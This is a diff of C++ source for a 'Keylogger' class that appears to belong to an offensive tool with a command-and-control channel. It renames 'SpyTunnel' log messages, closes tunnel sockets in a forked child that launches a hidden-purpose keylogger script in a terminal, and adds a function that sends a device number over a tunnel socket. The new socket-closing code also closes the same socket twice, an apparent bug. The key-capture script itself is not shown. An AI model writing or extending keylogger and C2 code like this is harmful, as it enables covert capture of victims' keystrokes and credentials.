@@ -5,27 +5,34 @@
 void Keylogger::run() {
     pid_ = fork();
     if (pid_ == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
+        std::cerr << RED << "[Keylogger::run] Error creating child process" << RESET;
         return;
     } else if (pid_ == 0) {
+        if (tunnel_socket_ != -1) {
+            close(tunnel_socket_);
+        }
+        if (tunnel_end_socket_ != -1) {
+            close(tunnel_socket_);
+        }
+
         spawn_window();
         _exit(EXIT_FAILURE);
     }
 
     int tries = 0;
     while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
-        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
+        std::cout << YELLOW << "[Keylogger::run] Waiting for FIFO file to be created..." << RESET;
         std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
 
     if (tunnel_fifo_ == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
+        std::cerr << RED << "[Keylogger::run] Error opening FIFO file" << RESET;
         return;
     }
     
     tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
     if (tunnel_shutdown_fd_.fd == -1) {
-        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
+        write_fifo_error("[Keylogger::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
         return;
     }
 
@@ -67,7 +74,6 @@ void Keylogger::run() {
             if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                 uint64_t u;
                 read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
-                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
                 if (tunnel_fifo_ != -1) {
                     write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                     close(tunnel_fifo_);
@@ -102,3 +108,6 @@ void Keylogger::spawn_window() {
     execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), layout_.c_str(), (char*)NULL);
 }
 
+void Keylogger::send_dev() {
+    send(tunnel_end_socket_, &dev_num_, sizeof(dev_num_), 0);
+}
